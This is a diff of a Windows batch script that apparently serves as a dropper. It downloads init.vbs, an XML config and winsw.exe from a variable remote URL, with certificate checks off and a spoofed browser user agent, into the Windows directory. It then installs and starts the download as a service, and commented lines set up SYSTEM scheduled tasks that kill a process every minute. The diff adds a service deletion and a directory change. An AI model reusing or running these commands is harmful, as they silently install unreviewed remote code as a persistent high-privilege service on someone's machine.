@@ -87,10 +87,12 @@ rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
 rem schtasks /create /tn sys /xml %windir%\sys.xml /F
 rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F
+sc delete initsw
 wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\init.vbs
 rem wget --no-check-certificate %urlgit%/initsw.xml  -O %windir%\initsw.xml
 curl -A "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" -L %urlgit%/initsw.xml -o %windir%\initsw.xml 
 wget --no-check-certificate %urlgit%/winsw.exe  -O %windir%\initsw.exe
+cd %windir%
 initsw.exe install
 net start initsw
 rem %windir%\init.vbs
